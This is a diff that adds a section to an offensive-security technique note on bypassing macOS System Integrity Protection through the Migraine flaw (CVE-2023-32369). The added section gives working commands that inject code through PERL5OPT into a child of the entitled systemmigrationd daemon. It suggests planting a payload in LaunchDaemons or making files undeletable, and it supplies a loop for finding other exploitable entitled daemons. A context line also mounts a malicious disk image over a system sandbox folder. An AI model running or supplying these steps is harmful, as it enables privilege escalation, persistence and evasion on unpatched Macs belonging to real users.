@@ -4,7 +4,7 @@ type: technique
 tags: [macos, sip, privesc, evasion]
 phase: privilege-escalation
 date_created: 2026-07-14
-date_updated: 2026-07-14
+date_updated: 2026-07-15
 sources: [hacktricks-macos]
 ---
 
@@ -36,3 +36,23 @@ hdiutil attach -mountpoint /System/Library/Sandbox/ evil.dmg
 ```
 
 Relevant SIP entitlements to hunt on binaries: `com.apple.rootless.install[.heritable]`, `com.apple.rootless.kext-management`, `com.apple.rootless.restricted-nvram-variables[.heritable]`, `com.apple.rootless.datavault.controller`.
+
+## SIP bypass via env-injected entitled daemon (Migraine, CVE-2023-32369)
+
+Chaining the interpreter-env trick with a daemon that holds `com.apple.rootless.install.heritable` yields a full SIP bypass, because children of such a daemon inherit the SIP exception. In Migraine the daemon is `systemmigrationd`, which spawns the Apple-signed `/usr/bin/perl /usr/libexec/migrateLocalKDC`. As root you can set a system-wide env var that the daemon's child perl will honor, so your code runs outside SIP:
+
+```bash
+# as root, poison the environment the entitled child will inherit
+launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
+# trigger a migration (systemmigrationd eventually spawns the perl child)
+open -a "Migration Assistant.app"
+```
+
+When `migrateLocalKDC` runs, perl executes `migraine.sh` in a SIP-less context: from there drop a payload into `/System/Library/LaunchDaemons` or slap `com.apple.rootless` on a file to make it undeletable. The generic lesson: enumerate daemons with `com.apple.rootless.install.heritable` (or other SIP-exception entitlements) that spawn env-honoring interpreters (perl `PERL5OPT`, bash `BASH_ENV`), and poison their inherited environment. Patched in Ventura 13.4 / Monterey 12.6.6 / Big Sur 11.7.7.
+
+```bash
+# find candidate entitled daemons
+for b in /System/Library/PrivateFrameworks/*/Resources/* /usr/libexec/*; do
+  codesign -d --entitlements :- "$b" 2>/dev/null | grep -q rootless.install.heritable && echo "$b"
+done
+```
